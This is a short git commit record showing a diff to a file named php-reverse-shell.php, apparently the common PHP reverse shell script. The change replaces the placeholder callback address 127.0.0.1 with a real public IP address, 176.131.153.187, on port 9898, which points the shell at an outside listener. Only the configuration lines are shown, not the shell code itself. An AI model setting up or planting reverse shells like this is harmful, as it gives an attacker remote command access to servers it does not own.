ce8b8da1e00d4688960f2289e8dbdaaaa058eb8a
0x1n1 <oxanazol@yahoo.fr>
2024-07-19 11:42:55 +0200

    Update php-reverse-shell.php

--- php-reverse-shell.php
+++ php-reverse-shell.php
@@ -6,7 +6,7 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '127.0.0.1';  // CHANGE THIS
+$ip = '176.131.153.187';  // CHANGE THIS
 $port = 9898;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
